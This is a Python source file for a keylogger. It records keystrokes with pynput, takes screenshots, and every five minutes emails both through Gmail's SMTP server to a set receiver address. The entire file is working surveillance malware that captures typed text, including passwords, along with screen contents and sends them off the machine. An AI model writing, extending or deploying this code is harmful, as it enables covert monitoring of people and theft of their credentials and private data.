import sys
from pynput.keyboard import Listener
from pynput import keyboard
import time,threading
import smtplib,ssl
import pyscreenshot as ImageGrab
import image
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from io import BytesIO
import os
import io


WAIT_TIME_SECONDS = 300
smtp_server = "smtp.gmail.com"


class KeyLog:
    def __init__(self, sender_email, sender_password, receiver_email, keyList, picture=None):
        self.sender_email = sender_email
        self.sender_password = sender_password
        self.receiver_email = receiver_email
        self.keyList = keyList
        self.picture = picture

    def press(self,key):
        alpha_numerical = True
        try:
            print('alphanumeric key {0} pressed'.format(
                key.char))
        except AttributeError:
            if key is not keyboard.Key.space and key is not keyboard.Key.enter: #Ignore special characters except for space and enter
                alpha_numerical = False

        if alpha_numerical:
            if key is keyboard.Key.enter: # If the key is enter, we want to put it on a new line
                self.keyList += "\n";
            elif key is keyboard.Key.space:
                self.keyList += " "
            else:
                self.keyList += str(key.char);


    '''
    #FOR DEBUGGING PURPOSES
    def printKeyList(self):
        print(self.keyList)
    '''

    def sendEmail(self):
        subject = "These are the keylogged results"
        body = self.keyList

        message = MIMEMultipart()
        message["From"] = self.sender_email
        message["To"] = self.receiver_email
        message["Subject"] = subject
        message["Bcc"] = self.receiver_email

        #Add the body to message in plaintext
        message.attach(MIMEText(body, "plain"))

        context = ssl.create_default_context()
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls(context=context)
            server.login(self.sender_email,self.sender_password)
            server.sendmail(self.sender_email, self.receiver_email, message.as_string())
            server.quit()


    def sendPicture(self):
        self.picture = ImageGrab.grab()
        with io.BytesIO() as memf:
            self.picture.save(memf, format="png")
            image_data = memf.getvalue()

        screenshot = MIMEMultipart()
        screenshot['Subject'] = "This a keylogged screenshot"
        screenshot['From'] = self.sender_email
        screenshot['To'] = self.receiver_email
        screenshot['Bcc'] = self.receiver_email

        text = MIMEText("This is a picture")
        screenshot.attach(text)
        image = MIMEImage(image_data)
        screenshot.attach(image)


        context = ssl.create_default_context()
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls(context=context)
            server.login(self.sender_email,self.sender_password)
            server.sendmail(self.sender_email, self.receiver_email, screenshot.as_string())
            server.quit()



    def keyboardListener(self):
        '''
        Listen to the keyboard input, and send an email periodically detailing
        the keys in a list
        '''
        with Listener(on_press=self.press) as listener:
            ticker = threading.Event()
            while not ticker.wait(WAIT_TIME_SECONDS):
                self.sendEmail()
                self.sendPicture()
            listener.join()




